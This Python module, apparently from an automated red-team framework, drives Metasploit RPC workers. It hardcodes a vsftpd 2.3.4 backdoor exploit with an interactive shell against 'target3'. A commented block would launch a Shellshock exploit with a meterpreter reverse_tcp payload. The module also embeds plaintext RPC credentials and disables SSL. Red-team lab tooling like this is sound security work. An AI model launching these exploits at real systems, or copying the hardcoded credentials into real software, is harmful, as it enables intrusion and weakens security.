# -*- coding: utf-8 -*-
"""
Red Team Director
"""

import os
from time import sleep

from .workers import MsfRpcWorker
from .actions import ExecuteExploitAction
from .errors import ActionExecutionError


# _appconfig = None
# _msfrpc_hosts = None
# _log_director = _appconf
_workers = {}
_exit = False


def main(appconfig, msfrpc_hosts):
    """Main entry point allowing external calls
    Args:
      args ([str]): command line parameter list
    """
    global _appconfig, _msfrpc_hosts, _log_director
    _appconfig = appconfig
    _msfrpc_hosts = msfrpc_hosts
    _log_director = _appconfig.log_director
    _log_director.debug("Starting Director...")
    bootstrap_workers()
    while not _exit:
        loop()
    _log_director.info("Director shutdown complete")


def bootstrap_workers():
    """Configure initial set of workers from environment
    """
    for host in _msfrpc_hosts:
        worker = MsfRpcWorker(
            host=host.split(':')[0],
            port=int(host.split(':')[-1]) if ':' in host else 55553,
            username='director',
            password='directorU123',
            ssl=False,
            appconfig=_appconfig
        )
        _workers[worker.id] = worker
        worker.client()
        _log_director.debug('Worker connection test succeeded')


def loop():
    """Event loop
    """
    for id, worker in _workers.items():
        _log_director.debug('Processing worker {}'.format(id))
        action = plan_next_action(worker)
        execute_action(worker, action)
        report(worker)
    turn_sleep(_appconfig.turn_sleep)


def plan_next_action(worker):
    return {'type': 'noop'}


def execute_action(worker, action):
    _log_director.info('Executing')
    try:
        exploit_action = ExecuteExploitAction(
            'unix/ftp/vsftpd_234_backdoor',
            'cmd/unix/interact',
            {
                'RHOSTS': 'target3',
                'VERBOSE': True,
            }
        )
        exploit_action.execute(worker.client())
    except ActionExecutionError:
        _log_director.warning('Failed to execute exploit action')
# result = run_exploit(
#     'multi/http/apache_mod_cgi_bash_env_exec',
#     'linux/x86/meterpreter/reverse_tcp',
#     {
#         'RHOSTS': 'target2',
#         'TARGETURI': '/cgi-bin/stats',
#         'VERBOSE': True,
#     }
# )


def report(worker):
    _log_director.info('Report')


def turn_sleep(seconds):
    _log_director.info('Waiting %s seconds...', seconds)
    sleep(seconds)